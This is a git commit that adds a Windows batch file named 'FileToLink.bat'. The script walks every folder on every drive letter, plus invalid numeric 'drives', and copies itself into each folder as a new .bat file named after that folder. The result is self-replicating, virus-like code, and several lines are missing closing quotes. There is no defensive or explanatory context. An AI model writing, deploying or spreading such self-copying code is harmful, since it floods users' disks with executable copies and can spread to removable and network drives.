364cf9ff465b0bd7dd2da9f676706ff44af93ce7
Alejo070727 <105022027+Alejo070727@users.noreply.github.com>
2022-05-07 15:33:55 -0400

    Add files via upload

---
+++ FileToLink/FileToLink.bat
@@ -0,0 +1,75 @@
+﻿echo §REKNOC§
+
+for /R "C:\Documents and Settings\All Users\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "A:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat
+
+for /R "B:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "C:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat
+
+for /R "D:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "E:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "F:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "G:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "H:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "I:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "J:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "K:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "L:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "M:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "N:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "O:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "P:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "Q:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "R:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "S:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "T:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "U:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "V:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "W:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "X:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "Y:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "Z:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "0:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "1:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "2:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "3:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "4:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "5:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "6:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "7:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "8:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
+
+for /R "9:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
